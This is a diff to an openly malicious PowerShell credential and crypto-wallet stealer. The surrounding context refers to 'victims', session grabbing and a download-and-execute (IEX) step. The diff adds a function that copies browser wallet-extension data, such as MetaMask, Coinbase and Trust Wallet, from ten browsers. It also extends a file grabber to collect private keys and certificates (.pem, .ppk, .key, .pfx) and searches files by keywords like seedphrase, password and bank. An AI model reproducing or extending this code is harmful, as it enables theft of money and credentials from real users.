@@ -772,7 +772,7 @@ function Backup-Data {
         }
         $zephyr_path = "$env:appdata\Zephyr\wallets"
         New-Item -ItemType Directory -Path "$folder_crypto\Zephyr" -Force | Out-Null
-        if (Test-Path $zephyr_path) { Get-ChildItem -Path $zephyr_path -Filter "*.keys" -Recurse | Copy-Item -Destination "$folder_crypto\Zephyr" -Force	}	
+        if (Test-Path $zephyr_path) { Get-ChildItem -Path $zephyr_path -Filter "*.keys" -Recurse | Copy-Item -Destination "$folder_crypto\Zephyr" -Force}	
         foreach ($wallet in $wallet_paths.Keys) {
             foreach ($pathName in $wallet_paths[$wallet].Keys) {
                 $sourcePath = $wallet_paths[$wallet][$pathName]
@@ -785,6 +785,67 @@ function Backup-Data {
         }
     }
     Local_Crypto_Wallets
+	
+    function browserwallets {
+    $browserPaths = @{
+        "Brave"        = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
+        "Chrome"       = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
+        "Chromium"     = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
+        "Edge"         = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
+        "EpicPrivacy"  = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
+        "Iridium"      = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
+        "Opera"        = Join-Path $env:APPDATA "Opera Software\Opera Stable"
+        "OperaGX"      = Join-Path $env:APPDATA "Opera Software\Opera GX Stable"
+        "Vivaldi"      = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
+        "Yandex"       = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
+    }
+    
+    $walletDirs = @{
+        "nkbihfbeogaeaoehlefnkodbefgpgknn" = "Metamask"
+    	"ejbalbakoplchlghecdalmeeeajnimhm" = "Metamask2"
+        "bhghoamapcdpbohphigoooaddinpkbai" = "Authenticator"
+    	"odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Coinbase"
+    	"aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
+    	"hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda"
+        "fnjhmkhhmkbjkkabndcnnogagogbneec" = "Ronin"
+        "lgmpcpglpngdoalbgeoldeajfclnhafa" = "SafePal"
+        "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
+        "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
+        "nphplpgoakhhjchkkhmiggakijnkhfnd" = "Ton"
+    }
+    foreach ($browser in $browserPaths.GetEnumerator()) {
+        $browserName = $browser.Key
+        $browserPath = $browser.Value
+        if (Test-Path $browserPath) {
+            Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
+                $localExtensionsSettingsDir = $_.FullName
+                foreach ($walletDir in $walletDirs.GetEnumerator()) {
+                    $walletKey = $walletDir.Key
+                    $walletName = $walletDir.Value
+                    $extentionPath = Join-Path $localExtensionsSettingsDir $walletKey
+                    if (Test-Path $extentionPath) {
+                        if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
+                            try {
+                                $wallet_browser = "$walletName ($browserName)"
+                                $walletDirPath = Join-Path $folder_crypto $wallet_browser
+                                New-Item -ItemType Directory -Path $walletDirPath -Force | out-null
+                                Copy-Item -Path $extentionPath -Destination $walletDirPath -Recurse -Force
+                                $locationFile = Join-Path $walletDirPath "Location.txt"
+                                $extentionPath | Out-File -FilePath $locationFile -Force
+                                Write-Host "[!] Copied $walletName wallet from $extentionPath to $walletDirPath"  -ForegroundColor Green
+                            }
+                            catch {
+                                Write-Host "[!] Failed to copy $walletName wallet from $extentionPath"  -ForegroundColor Red
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    }
+    browserwallets
+ 
 	
     Write-Host "[!] Session Grabbing Ended" -ForegroundColor Green
 
@@ -799,24 +860,8 @@ function Backup-Data {
     $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $invokewebcam.WaitForExit()
 
-    # Works since most victims will have a weak password which can be bruteforced
-    #function ExportPrivateKeys {
-    #    $privatekeysfolder = "$important_files\Certificates and Private Keys"
-    #    New-Item -ItemType Directory -Path $privatekeysfolder -Force | Out-Null
-    #    $sourceDirectory = "$env:userprofile"
-    #    $fileExtensions = @("*.pem", "*.ppk", "*.key", "*.pfx")
-    #
-    #    foreach ($extension in $fileExtensions) {
-    #        $foundFiles = Get-ChildItem -Path $sourceDirectory -Filter $extension -File -Recurse
-    #        foreach ($file in $foundFiles) {
-    #            Copy-Item -Path $file.FullName -Destination $privatekeysfolder -Force
-    #        }
-    #    }
-    #}
-    #ExportPrivateKeys
-
     function FilesGrabber {
-        $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")
+        $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log", "*.pem", "*.ppk", "*.key", "*.pfx")
         $keywords = @("2fa", "account", "auth", "backup", "bank", "binance", "bitcoin", "bitwarden", "btc", "casino", "code", "coinbase ", "crypto", "dashlane", "discord", "eth", "exodus", "facebook", "funds", "info", "keepass", "keys", "kraken", "kucoin", "lastpass", "ledger", "login", "mail", "memo", "metamask", "mnemonic", "nordpass", "note", "pass", "passphrase", "paypal", "pgp", "private", "pw", "recovery", "remote", "roboform", "secret", "seedphrase", "server", "skrill", "smtp", "solana", "syncthing", "tether", "token", "trading", "trezor", "venmo", "vault", "wallet")
         $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
         foreach ($path in $paths) {
